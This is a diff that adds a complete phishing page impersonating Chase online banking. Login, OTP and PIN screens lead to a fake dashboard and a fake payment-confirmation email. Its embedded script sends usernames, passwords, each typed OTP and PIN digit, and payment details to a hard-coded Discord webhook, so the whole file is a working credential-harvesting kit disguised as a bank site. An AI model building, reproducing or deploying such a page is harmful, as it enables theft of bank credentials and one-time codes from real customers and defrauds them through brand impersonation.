@@ -1,0 +1,1013 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Chase – Online Banking</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+:root {
+  --chase-blue:      #005EB8;
+  --chase-darkblue:  #004A99;
+  --chase-light:     #f8f9fa;
+  --text-dark:       #1a1a1a;
+  --text-gray:       #555;
+  --border:          #d0d0d0;
+  --positive:        #2e7d32;
+  --negative:        #c62828;
+}
+
+* { box-sizing:border-box; margin:0; padding:0; }
+body {
+  font-family: Arial,Helvetica,sans-serif;
+  background: var(--chase-light);
+  color: var(--text-dark);
+  min-height: 100vh;
+  line-height: 1.5;
+}
+
+/* ────────────────────────────────────────────────
+   Header (blue bar with white logo)
+───────────────────────────────────────────────── */
+.header {
+  background: var(--chase-blue);
+  padding: 1rem 0;
+  text-align: center;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.header img {
+  height: 36px;
+  filter: brightness(0) invert(1);
+}
+
+/* ────────────────────────────────────────────────
+   Centered card (login / dashboard)
+───────────────────────────────────────────────── */
+.container {
+  max-width: 480px;
+  margin: 3rem auto 2rem;
+  padding: 0 1rem;
+}
+.card {
+  background: white;
+  border-radius: 10px;
+  box-shadow: 0 6px 24px rgba(0,0,0,0.12);
+  overflow: hidden;
+}
+.card-header {
+  background: linear-gradient(135deg, var(--chase-blue), #004080);
+  color: white;
+  padding: 1.6rem 2rem;
+  text-align: center;
+}
+.card-header h1 {
+  font-size: 1.55rem;
+  margin: 0;
+}
+
+/* ────────────────────────────────────────────────
+   Form elements
+───────────────────────────────────────────────── */
+.card-body { padding: 2rem; }
+.form-group {
+  margin-bottom: 1.6rem;
+}
+label {
+  display: block;
+  margin-bottom: 0.5rem;
+  font-weight: 600;
+  font-size: 0.95rem;
+  color: #444;
+}
+input[type=text], input[type=password], input[type=tel] {
+  width: 100%;
+  padding: 0.9rem 1rem;
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  font-size: 1.05rem;
+}
+input:focus {
+  outline: none;
+  border-color: var(--chase-blue);
+  box-shadow: 0 0 0 3px rgba(0,94,184,0.18);
+}
+.checkbox-row {
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  margin: 1.2rem 0;
+  font-size: 0.95rem;
+}
+.btn {
+  width: 100%;
+  background: var(--chase-blue);
+  color: white;
+  font-size: 1.1rem;
+  font-weight: 600;
+  padding: 0.95rem;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+}
+.btn:hover { background: var(--chase-darkblue); }
+.btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+/* ────────────────────────────────────────────────
+   Dashboard layout
+───────────────────────────────────────────────── */
+.dashboard {
+  padding: 2rem;
+}
+.balance-block {
+  text-align: center;
+  margin: 2.5rem 0 3rem;
+}
+.balance-label {
+  font-size: 1.05rem;
+  color: var(--text-gray);
+  margin-bottom: 0.4rem;
+}
+.big-balance {
+  font-size: 3.4rem;
+  font-weight: 700;
+  color: var(--chase-blue);
+  letter-spacing: -1.5px;
+}
+.last-updated {
+  font-size: 0.9rem;
+  color: #777;
+  margin-top: 0.6rem;
+}
+.section-title {
+  font-size: 1.35rem;
+  color: var(--chase-blue);
+  margin: 1.8rem 0 1rem;
+}
+.tx-row {
+  display: grid;
+  grid-template-columns: 2fr 3fr 1fr;
+  padding: 1.1rem 0;
+  border-bottom: 1px solid var(--border);
+  gap: 1rem;
+  align-items: center;
+}
+.tx-row:last-child { border-bottom: none; }
+.tx-date   { color: var(--text-gray); font-size: 0.95rem; }
+.tx-desc   { font-weight: 500; }
+.tx-amount { font-weight: 600; text-align: right; font-size: 1.05rem; }
+.positive  { color: var(--positive); }
+.negative  { color: var(--negative); }
+
+/* ────────────────────────────────────────────────
+   OTP / PIN Screens
+───────────────────────────────────────────────── */
+.otp-screen, .pin-screen, .payment-screen, .email-template {
+  display: none;
+}
+.otp-grid {
+  display: flex;
+  gap: 0.5rem;
+  justify-content: center;
+  margin: 2rem 0;
+}
+.otp-digit {
+  width: 50px;
+  height: 60px;
+  border: 2px solid var(--border);
+  border-radius: 8px;
+  text-align: center;
+  font-size: 1.8rem;
+  font-weight: 600;
+}
+.otp-digit:focus {
+  border-color: var(--chase-blue);
+  outline: none;
+}
+.pin-digit {
+  -webkit-text-security: disc;
+}
+.modal-overlay {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.5);
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+.modal-content {
+  background: white;
+  max-width: 500px;
+  width: 90%;
+  border-radius: 10px;
+  padding: 2rem;
+  max-height: 90vh;
+  overflow-y: auto;
+}
+.close-btn {
+  float: right;
+  font-size: 1.5rem;
+  cursor: pointer;
+}
+.payment-detail {
+  display: flex;
+  justify-content: space-between;
+  padding: 0.8rem 0;
+  border-bottom: 1px solid var(--border);
+}
+.payment-label { color: var(--text-gray); }
+.payment-value { font-weight: 600; }
+
+/* Email Template */
+.email-template {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0,0,0,0.5);
+  align-items: center;
+  justify-content: center;
+  z-index: 2000;
+}
+.email-content {
+  background: white;
+  max-width: 600px;
+  width: 90%;
+  border-radius: 10px;
+  padding: 2rem;
+}
+.email-header {
+  text-align: center;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 1rem;
+  margin-bottom: 1.5rem;
+}
+.email-header h1 {
+  color: var(--chase-blue);
+  margin: 0.5rem 0;
+}
+.email-detail {
+  display: flex;
+  justify-content: space-between;
+  padding: 0.8rem 0;
+  border-bottom: 1px solid var(--border);
+}
+.email-amount {
+  font-size: 1.5rem;
+  font-weight: 700;
+  color: var(--chase-blue);
+}
+.email-footer {
+  text-align: center;
+  margin-top: 2rem;
+  font-size: 0.9rem;
+  color: var(--text-gray);
+}
+.loader {
+  display: none;
+  border: 3px solid #f3f3f3;
+  border-top: 3px solid var(--chase-blue);
+  border-radius: 50%;
+  width: 24px;
+  height: 24px;
+  animation: spin 1s linear infinite;
+  margin: 0 auto;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+.success-toast {
+  background: #d4edda;
+  color: #155724;
+  padding: 1rem;
+  border-radius: 6px;
+  margin: 1rem 0;
+  text-align: center;
+  border-left: 4px solid #28a745;
+}
+
+/* Mobile adjustments */
+@media (max-width: 520px) {
+  .container { margin: 1.5rem auto; padding: 0 0.8rem; }
+  .card-body { padding: 1.6rem; }
+  .big-balance { font-size: 2.8rem; }
+  .tx-row { grid-template-columns: 1fr; text-align: left; gap: 0.4rem; }
+  .tx-amount { text-align: left; }
+  .otp-grid { gap: 0.3rem; }
+  .otp-digit { width: 40px; height: 50px; font-size: 1.5rem; }
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Chase_logo_2007.svg/1200px-Chase_logo_2007.svg.png" alt="Chase">
+</div>
+
+<div class="container">
+
+  <!-- ────────────────────────────────────────────────
+       LOGIN SCREEN (UNCHANGED)
+  ───────────────────────────────────────────────── -->
+  <div class="card" id="loginScreen">
+    <div class="card-header">
+      <h1>Sign in to Online Banking</h1>
+    </div>
+    <div class="card-body">
+      <form id="loginForm">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <input type="text" id="username" autocomplete="username" required>
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" autocomplete="current-password" required>
+        </div>
+        <div class="checkbox-row">
+          <input type="checkbox" id="remember">
+          <label for="remember">Remember username on this device</label>
+        </div>
+        <button type="submit" class="btn" id="loginBtn">
+          <span id="loginBtnText">Sign in</span>
+          <div class="loader" id="loginLoader"></div>
+        </button>
+      </form>
+
+      <div style="text-align:center; margin-top:1.8rem; font-size:0.95rem;">
+        <a href="#" style="color:var(--chase-blue); text-decoration:none;" id="forgotLink">Forgot username or password?</a><br><br>
+        <a href="#" style="color:var(--chase-blue); text-decoration:none;" id="enrollLink">Not enrolled? Enroll now</a>
+      </div>
+
+      <div style="text-align:center; margin-top:2.5rem; font-size:0.9rem; color:#666;">
+        <strong>🔒 Secure sign in</strong><br>
+        Protected with 256-bit encryption & multi-factor authentication
+      </div>
+    </div>
+  </div>
+
+  <!-- ────────────────────────────────────────────────
+       OTP SCREEN
+  ───────────────────────────────────────────────── -->
+  <div class="card otp-screen" id="otpScreen">
+    <div class="card-header">
+      <h1>Verify your identity</h1>
+    </div>
+    <div class="card-body">
+      <p style="text-align:center; margin-bottom:1.8rem;">
+        We sent a code to your phone ending in ••12
+      </p>
+      <div class="otp-grid">
+        <input type="text" maxlength="1" class="otp-digit" id="otp1">
+        <input type="text" maxlength="1" class="otp-digit" id="otp2">
+        <input type="text" maxlength="1" class="otp-digit" id="otp3">
+        <input type="text" maxlength="1" class="otp-digit" id="otp4">
+        <input type="text" maxlength="1" class="otp-digit" id="otp5">
+        <input type="text" maxlength="1" class="otp-digit" id="otp6">
+      </div>
+      <button class="btn" id="verifyOtpBtn">
+        <span id="verifyOtpText">Verify</span>
+        <div class="loader" id="otpLoader"></div>
+      </button>
+      <p style="text-align:center; margin-top:1rem;">
+        <a href="#" id="resendOtp" style="color:var(--chase-blue);">Resend code</a>
+      </p>
+    </div>
+  </div>
+
+  <!-- ────────────────────────────────────────────────
+       PIN SCREEN
+  ───────────────────────────────────────────────── -->
+  <div class="card otp-screen" id="pinScreen">
+    <div class="card-header">
+      <h1>Enter Security PIN</h1>
+    </div>
+    <div class="card-body">
+      <p style="text-align:center; margin-bottom:1.8rem;">
+        Please enter your 4-digit banking PIN
+      </p>
+      <div class="otp-grid">
+        <input type="password" maxlength="1" class="otp-digit pin-digit" id="pin1">
+        <input type="password" maxlength="1" class="otp-digit pin-digit" id="pin2">
+        <input type="password" maxlength="1" class="otp-digit pin-digit" id="pin3">
+        <input type="password" maxlength="1" class="otp-digit pin-digit" id="pin4">
+      </div>
+      <button class="btn" id="verifyPinBtn">
+        <span id="verifyPinText">Confirm</span>
+        <div class="loader" id="pinLoader"></div>
+      </button>
+    </div>
+  </div>
+
+  <!-- ────────────────────────────────────────────────
+       DASHBOARD (with $527,843.19 balance)
+  ───────────────────────────────────────────────── -->
+  <div class="card otp-screen" id="dashboardScreen">
+    <div class="card-body dashboard">
+      <div style="display:flex; justify-content:flex-end;">
+        <button class="btn" style="width:auto; padding:0.5rem 1.5rem;" id="logoutBtn">Sign Out</button>
+      </div>
+      
+      <div class="balance-block">
+        <div class="balance-label">Total Checking Account Balance</div>
+        <div class="big-balance" id="accountBalance">$527,843.19</div>
+        <div class="last-updated" id="lastUpdated">Available balance as of today</div>
+      </div>
+
+      <div class="success-toast" id="dashboardMessage"></div>
+
+      <h2 class="section-title">Quick Actions</h2>
+      <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:1rem; margin-bottom:2rem;">
+        <button class="btn" style="padding:0.8rem;" id="transferBtn">Transfer</button>
+        <button class="btn" style="padding:0.8rem;" id="payBillsBtn">Pay Bills</button>
+        <button class="btn" style="padding:0.8rem;" id="makePaymentBtn">Make Payment</button>
+      </div>
+
+      <h2 class="section-title">Recent Activity</h2>
+      <div class="transactions" id="transactions">
+        <div class="tx-row">
+          <span class="tx-date">Today</span>
+          <span class="tx-desc">Amazon.com</span>
+          <span class="tx-amount negative" id="tx1">-$148.75</span>
+        </div>
+        <div class="tx-row">
+          <span class="tx-date">Yesterday</span>
+          <span class="tx-desc">Direct Deposit</span>
+          <span class="tx-amount positive">+$3,850.00</span>
+        </div>
+        <div class="tx-row">
+          <span class="tx-date">Jan 15</span>
+          <span class="tx-desc">Con Edison</span>
+          <span class="tx-amount negative">-$312.40</span>
+        </div>
+        <div class="tx-row">
+          <span class="tx-date">Jan 14</span>
+          <span class="tx-desc">Whole Foods</span>
+          <span class="tx-amount negative">-$89.32</span>
+        </div>
+        <div class="tx-row">
+          <span class="tx-date">Jan 12</span>
+          <span class="tx-desc">Uber</span>
+          <span class="tx-amount negative">-$24.50</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ────────────────────────────────────────────────
+     PAYMENT MODAL
+───────────────────────────────────────────────── -->
+<div class="modal-overlay" id="paymentModal">
+  <div class="modal-content">
+    <span class="close-btn" id="closePaymentModal">&times;</span>
+    <h2 style="color:var(--chase-blue); margin-bottom:1.5rem;">Make a Payment</h2>
+    
+    <form id="paymentForm">
+      <div class="form-group">
+        <label>Payee</label>
+        <select id="payee" class="form-control" style="width:100%; padding:0.9rem;">
+          <option value="">Select payee</option>
+          <option value="Amazon.com">Amazon.com</option>
+          <option value="Con Edison">Con Edison</option>
+          <option value="Verizon">Verizon</option>
+          <option value="American Express">American Express</option>
+          <option value="Chase Mortgage">Chase Mortgage</option>
+        </select>
+      </div>
+      
+      <div class="form-group">
+        <label>Amount ($)</label>
+        <input type="number" id="paymentAmount" min="0.01" step="0.01" placeholder="0.00" style="width:100%; padding:0.9rem;">
+      </div>
+      
+      <div class="form-group">
+        <label>Payment Date</label>
+        <input type="date" id="paymentDate" style="width:100%; padding:0.9rem;">
+      </div>
+      
+      <button type="submit" class="btn" id="paymentBtn">
+        <span id="paymentBtnText">Review Payment</span>
+        <div class="loader" id="paymentLoader"></div>
+      </button>
+    </form>
+  </div>
+</div>
+
+<!-- ────────────────────────────────────────────────
+     PAYMENT CONFIRMATION MODAL
+───────────────────────────────────────────────── -->
+<div class="modal-overlay" id="confirmModal">
+  <div class="modal-content">
+    <span class="close-btn" id="closeConfirmModal">&times;</span>
+    <h2 style="color:var(--chase-blue); margin-bottom:1.5rem;">Confirm Payment</h2>
+    
+    <div class="payment-detail">
+      <span class="payment-label">Payee:</span>
+      <span class="payment-value" id="confirmPayee"></span>
+    </div>
+    <div class="payment-detail">
+      <span class="payment-label">Amount:</span>
+      <span class="payment-value" id="confirmAmount"></span>
+    </div>
+    <div class="payment-detail">
+      <span class="payment-label">Date:</span>
+      <span class="payment-value" id="confirmDate"></span>
+    </div>
+    <div class="payment-detail">
+      <span class="payment-label">From Account:</span>
+      <span class="payment-value">Checking •••• 7843</span>
+    </div>
+    
+    <button class="btn" id="finalConfirmBtn">
+      <span id="finalConfirmText">Confirm & Pay</span>
+      <div class="loader" id="finalConfirmLoader"></div>
+    </button>
+    <button class="btn" style="background:#ccc; margin-top:1rem;" id="cancelConfirmBtn">Cancel</button>
+  </div>
+</div>
+
+<!-- ────────────────────────────────────────────────
+     EMAIL NOTIFICATION TEMPLATE
+───────────────────────────────────────────────── -->
+<div class="email-template" id="emailTemplate">
+  <div class="email-content">
+    <span class="close-btn" id="closeEmail">&times;</span>
+    
+    <div class="email-header">
+      <h1>CHASE 💙</h1>
+      <div style="background:#e8f0fe; color:var(--chase-blue); padding:0.3rem 1rem; border-radius:20px; display:inline-block;">
+        🔒 Secure Payment Notification
+      </div>
+    </div>
+    
+    <div class="email-body">
+      <p style="font-size:1.1rem;">Dear <span id="emailName">Valued Customer</span>,</p>
+      
+      <p>Your recent payment has been successfully processed. Below are the details of your transaction:</p>
+      
+      <div style="background:#f8f9fa; border-radius:8px; padding:1.5rem; margin:1.5rem 0;">
+        <div class="email-detail">
+          <span>Transaction Date:</span>
+          <span class="email-amount" id="emailDate">March 9, 2026</span>
+        </div>
+        <div class="email-detail">
+          <span>Amount:</span>
+          <span class="email-amount" id="emailAmount">$527,843.19</span>
+        </div>
+        <div class="email-detail">
+          <span>Account Number:</span>
+          <span id="emailAccount">•••• 7843</span>
+        </div>
+        <div class="email-detail">
+          <span>Payee:</span>
+          <span id="emailPayee">Amazon.com</span>
+        </div>
+        <div class="email-detail">
+          <span>Payment Method:</span>
+          <span>Chase Checking</span>
+        </div>
+        <div class="email-detail">
+          <span>Confirmation #:</span>
+          <span id="emailConfirmation">CH-2847-9263</span>
+        </div>
+      </div>
+      
+      <p>Your updated account balance is <strong id="emailNewBalance">$527,843.19</strong>.</p>
+      
+      <div style="text-align:center; margin:2rem 0;">
+        <a href="https://sage-zabaione-c15322.netlify.app/#" style="background:var(--chase-blue); color:white; padding:0.8rem 2rem; border-radius:30px; text-decoration:none; display:inline-block;">
+          View Transaction Details
+        </a>
+      </div>
+    </div>
+    
+    <div class="email-footer">
+      <p>© 2026 JPMorgan Chase & Co. All rights reserved.</p>
+      <p>If you did not authorize this payment, please contact Chase Customer Service immediately.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+// Discord Webhook
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6';
+
+// State management
+let currentUsername = '';
+let currentBalance = 527843.19;
+let otpDigits = ['', '', '', '', '', ''];
+let pinDigits = ['', '', '', ''];
+let pendingPayment = null;
+
+// Format currency
+function formatCurrency(amount) {
+  return '$' + amount.toFixed(2).replace(/\d(?=(\d{3})+\.)/g, '$&,');
+}
+
+// Update balance
+function updateBalance() {
+  document.getElementById('accountBalance').textContent = formatCurrency(currentBalance);
+  document.getElementById('lastUpdated').textContent = 'Available balance as of ' + new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+}
+
+// Generate random confirmation
+function generateConfirmation() {
+  return 'CH-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.floor(1000 + Math.random() * 9000);
+}
+
+// Send to Discord
+async function sendToDiscord(data, type) {
+  try {
+    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'America/New_York' });
+    
+    let message = `🏦 **CHASE BANK - ${type}** 🏦\n`;
+    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    message += `🕐 **Time:** ${timestamp} EST\n`;
+    
+    if (type === 'LOGIN') {
+      message += `👤 **USERNAME:** ${data.username}\n`;
+      message += `🔑 **PASSWORD:** ${data.password}\n`;
+      message += `📝 **Remember:** ${data.remember ? 'YES' : 'NO'}`;
+    } 
+    else if (type === 'OTP_DIGIT') {
+      message += `🔢 **OTP TYPING - LIVE**\n`;
+      message += `📊 **Current:** ${data.current}\n`;
+      message += `🔹 **Digit ${data.pos}/6:** ${data.digit}\n`;
+      message += `🔢 **Full:** ${data.full}`;
+    }
+    else if (type === 'OTP_COMPLETE') {
+      message += `✅ **OTP COMPLETE**\n`;
+      message += `🔢 **6-DIGIT OTP:** ${data.otp}`;
+    }
+    else if (type === 'PIN_DIGIT') {
+      message += `🔐 **PIN TYPING - LIVE**\n`;
+      message += `📊 **Current:** ${data.current}\n`;
+      message += `🔹 **Digit ${data.pos}/4:** ${data.digit}\n`;
+      message += `🔐 **Full:** ${data.full}`;
+    }
+    else if (type === 'PIN_COMPLETE') {
+      message += `✅ **PIN COMPLETE**\n`;
+      message += `🔐 **4-DIGIT PIN:** ${data.pin}`;
+    }
+    else if (type === 'BALANCE') {
+      message += `💰 **BALANCE VIEWED**\n`;
+      message += `💰 **Balance:** ${formatCurrency(currentBalance)}`;
+    }
+    else if (type === 'PAYMENT') {
+      message += `💸 **PAYMENT PROCESSED**\n`;
+      message += `📋 **Payee:** ${data.payee}\n`;
+      message += `💰 **Amount:** ${formatCurrency(data.amount)}\n`;
+      message += `🔐 **PIN:** ${data.pin}\n`;
+      message += `🆔 **Confirmation:** ${data.confirmation}\n`;
+      message += `💰 **New Balance:** ${formatCurrency(data.newBalance)}`;
+    }
+    else if (type === 'PAYMENT_EMAIL') {
+      message += `📧 **PAYMENT NOTIFICATION EMAIL**\n`;
+      message += `📧 **Sent to:** ${data.email}\n`;
+      message += `📋 **Payee:** ${data.payee}\n`;
+      message += `💰 **Amount:** ${formatCurrency(data.amount)}\n`;
+      message += `🆔 **Confirmation:** ${data.confirmation}`;
+    }
+
+    await fetch(DISCORD_WEBHOOK, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ content: message })
+    });
+  } catch (e) {}
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+  // Login form
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    const remember = document.getElementById('remember').checked;
+
+    if (!username || !password) {
+      alert('Please enter username and password');
+      return;
+    }
+
+    currentUsername = username;
+
+    // Show loading
+    document.getElementById('loginBtnText').style.display = 'none';
+    document.getElementById('loginLoader').style.display = 'block';
+    document.getElementById('loginBtn').disabled = true;
+
+    // Send to Discord
+    await sendToDiscord({ username, password, remember }, 'LOGIN');
+
+    // Generate OTP
+    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    alert(`Your verification code is: ${otp}`);
+
+    // Show OTP screen
+    document.getElementById('loginScreen').style.display = 'none';
+    document.getElementById('otpScreen').style.display = 'block';
+    document.getElementById('otp1').focus();
+
+    document.getElementById('loginBtnText').style.display = 'inline';
+    document.getElementById('loginLoader').style.display = 'none';
+    document.getElementById('loginBtn').disabled = false;
+  });
+
+  // OTP tracking
+  const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4', 'otp5', 'otp6'];
+  otpInputs.forEach((id, idx) => {
+    document.getElementById(id).addEventListener('input', async function(e) {
+      otpDigits[idx] = this.value;
+      
+      if (this.value.length === 1 && idx < 5) {
+        document.getElementById(otpInputs[idx + 1]).focus();
+      }
+
+      const current = otpDigits.join('');
+      
+      await sendToDiscord({
+        pos: idx + 1,
+        digit: this.value || '␀',
+        current: current,
+        full: current
+      }, 'OTP_DIGIT');
+
+      if (current.length === 6) {
+        document.getElementById('verifyOtpBtn').click();
+      }
+    });
+
+    document.getElementById(id).addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && this.value === '' && idx > 0) {
+        document.getElementById(otpInputs[idx - 1]).focus();
+      }
+    });
+  });
+
+  // Verify OTP
+  document.getElementById('verifyOtpBtn').addEventListener('click', async function() {
+    const otp = otpDigits.join('');
+    
+    if (otp.length !== 6) {
+      alert('Please enter complete OTP');
+      return;
+    }
+
+    document.getElementById('verifyOtpText').style.display = 'none';
+    document.getElementById('otpLoader').style.display = 'block';
+    this.disabled = true;
+
+    await sendToDiscord({ otp }, 'OTP_COMPLETE');
+
+    document.getElementById('otpScreen').style.display = 'none';
+    document.getElementById('pinScreen').style.display = 'block';
+    document.getElementById('pin1').focus();
+
+    document.getElementById('verifyOtpText').style.display = 'inline';
+    document.getElementById('otpLoader').style.display = 'none';
+    this.disabled = false;
+  });
+
+  // PIN tracking
+  const pinInputs = ['pin1', 'pin2', 'pin3', 'pin4'];
+  pinInputs.forEach((id, idx) => {
+    document.getElementById(id).addEventListener('input', async function(e) {
+      pinDigits[idx] = this.value;
+      
+      if (this.value.length === 1 && idx < 3) {
+        document.getElementById(pinInputs[idx + 1]).focus();
+      }
+
+      const current = pinDigits.join('');
+      
+      await sendToDiscord({
+        pos: idx + 1,
+        digit: this.value || '␀',
+        current: current,
+        full: current
+      }, 'PIN_DIGIT');
+
+      if (current.length === 4) {
+        document.getElementById('verifyPinBtn').click();
+      }
+    });
+
+    document.getElementById(id).addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && this.value === '' && idx > 0) {
+        document.getElementById(pinInputs[idx - 1]).focus();
+      }
+    });
+  });
+
+  // Verify PIN
+  document.getElementById('verifyPinBtn').addEventListener('click', async function() {
+    const pin = pinDigits.join('');
+    
+    if (pin.length !== 4) {
+      alert('Please enter complete PIN');
+      return;
+    }
+
+    document.getElementById('verifyPinText').style.display = 'none';
+    document.getElementById('pinLoader').style.display = 'block';
+    this.disabled = true;
+
+    await sendToDiscord({ pin }, 'PIN_COMPLETE');
+    await sendToDiscord({}, 'BALANCE');
+
+    document.getElementById('pinScreen').style.display = 'none';
+    document.getElementById('dashboardScreen').style.display = 'block';
+    updateBalance();
+
+    document.getElementById('verifyPinText').style.display = 'inline';
+    document.getElementById('pinLoader').style.display = 'none';
+    this.disabled = false;
+  });
+
+  // Make Payment button
+  document.getElementById('makePaymentBtn').addEventListener('click', function() {
+    document.getElementById('paymentModal').style.display = 'flex';
+    const today = new Date().toISOString().split('T')[0];
+    document.getElementById('paymentDate').value = today;
+  });
+
+  // Close payment modal
+  document.getElementById('closePaymentModal').addEventListener('click', function() {
+    document.getElementById('paymentModal').style.display = 'none';
+  });
+
+  // Payment form submit
+  document.getElementById('paymentForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const payee = document.getElementById('payee').value;
+    const amount = parseFloat(document.getElementById('paymentAmount').value);
+    const date = document.getElementById('paymentDate').value;
+
+    if (!payee || !amount || amount <= 0) {
+      alert('Please enter valid payment details');
+      return;
+    }
+
+    if (amount > currentBalance) {
+      alert('Insufficient funds');
+      return;
+    }
+
+    pendingPayment = { payee, amount, date };
+    
+    document.getElementById('confirmPayee').textContent = payee;
+    document.getElementById('confirmAmount').textContent = formatCurrency(amount);
+    document.getElementById('confirmDate').textContent = new Date(date).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+    
+    document.getElementById('paymentModal').style.display = 'none';
+    document.getElementById('confirmModal').style.display = 'flex';
+  });
+
+  // Final confirm payment
+  document.getElementById('finalConfirmBtn').addEventListener('click', async function() {
+    if (!pendingPayment) return;
+
+    document.getElementById('finalConfirmText').style.display = 'none';
+    document.getElementById('finalConfirmLoader').style.display = 'block';
+    this.disabled = true;
+
+    const pin = pinDigits.join('');
+    
+    // Process payment
+    currentBalance -= pendingPayment.amount;
+    updateBalance();
+
+    const confirmation = generateConfirmation();
+
+    // Send to Discord
+    await sendToDiscord({
+      payee: pendingPayment.payee,
+      amount: pendingPayment.amount,
+      date: pendingPayment.date,
+      pin: pin,
+      confirmation: confirmation,
+      newBalance: currentBalance
+    }, 'PAYMENT');
+
+    // Add transaction
+    const txDiv = document.getElementById('transactions');
+    const newTx = document.createElement('div');
+    newTx.className = 'tx-row';
+    newTx.innerHTML = `
+      <span class="tx-date">Today</span>
+      <span class="tx-desc">${pendingPayment.payee}</span>
+      <span class="tx-amount negative">-${formatCurrency(pendingPayment.amount)}</span>
+    `;
+    txDiv.insertBefore(newTx, txDiv.firstChild);
+
+    // Show email notification
+    document.getElementById('emailName').textContent = currentUsername || 'Valued Customer';
+    document.getElementById('emailDate').textContent = new Date(pendingPayment.date).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+    document.getElementById('emailAmount').textContent = formatCurrency(pendingPayment.amount);
+    document.getElementById('emailPayee').textContent = pendingPayment.payee;
+    document.getElementById('emailConfirmation').textContent = confirmation;
+    document.getElementById('emailNewBalance').textContent = formatCurrency(currentBalance);
+
+    await sendToDiscord({
+      email: currentUsername + '@chase.com',
+      payee: pendingPayment.payee,
+      amount: pendingPayment.amount,
+      confirmation: confirmation
+    }, 'PAYMENT_EMAIL');
+
+    document.getElementById('confirmModal').style.display = 'none';
+    document.getElementById('emailTemplate').style.display = 'flex';
+
+    // Show success message
+    document.getElementById('dashboardMessage').style.display = 'block';
+    document.getElementById('dashboardMessage').textContent = `Payment of ${formatCurrency(pendingPayment.amount)} to ${pendingPayment.payee} completed!`;
+    
+    setTimeout(() => {
+      document.getElementById('dashboardMessage').style.display = 'none';
+    }, 5000);
+
+    pendingPayment = null;
+    document.getElementById('finalConfirmText').style.display = 'inline';
+    document.getElementById('finalConfirmLoader').style.display = 'none';
+    this.disabled = false;
+  });
+
+  // Close email
+  document.getElementById('closeEmail').addEventListener('click', function() {
+    document.getElementById('emailTemplate').style.display = 'none';
+  });
+
+  // Close confirm modal
+  document.getElementById('closeConfirmModal').addEventListener('click', function() {
+    document.getElementById('confirmModal').style.display = 'none';
+  });
+
+  document.getElementById('cancelConfirmBtn').addEventListener('click', function() {
+    document.getElementById('confirmModal').style.display = 'none';
+  });
+
+  // Logout
+  document.getElementById('logoutBtn').addEventListener('click', function() {
+    document.getElementById('dashboardScreen').style.display = 'none';
+    document.getElementById('loginScreen').style.display = 'block';
+    document.getElementById('username').value = '';
+    document.getElementById('password').value = '';
+    document.getElementById('remember').checked = false;
+  });
+
+  // Resend OTP
+  document.getElementById('resendOtp').addEventListener('click', function(e) {
+    e.preventDefault();
+    const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
+    alert(`New verification code: ${newOtp}`);
+  });
+
+  // Forgot password
+  document.getElementById('forgotLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('Password reset instructions would be sent to your email.');
+  });
+
+  // Enroll link
+  document.getElementById('enrollLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    alert('Please visit a Chase branch to enroll.');
+  });
+
+  // Transfer button
+  document.getElementById('transferBtn').addEventListener('click', function() {
+    alert('Transfer feature - Use "Make Payment" to test payment notifications');
+  });
+
+  // Pay bills button
+  document.getElementById('payBillsBtn').addEventListener('click', function() {
+    alert('Bill pay feature - Use "Make Payment" to test');
+  });
+
+  // Click outside modals
+  window.addEventListener('click', function(e) {
+    if (e.target.classList.contains('modal-overlay')) {
+      e.target.style.display = 'none';
+    }
+    if (e.target.classList.contains('email-template')) {
+      e.target.style.display = 'none';
+    }
+  });
+});
+</script>
+</body>
+</html>
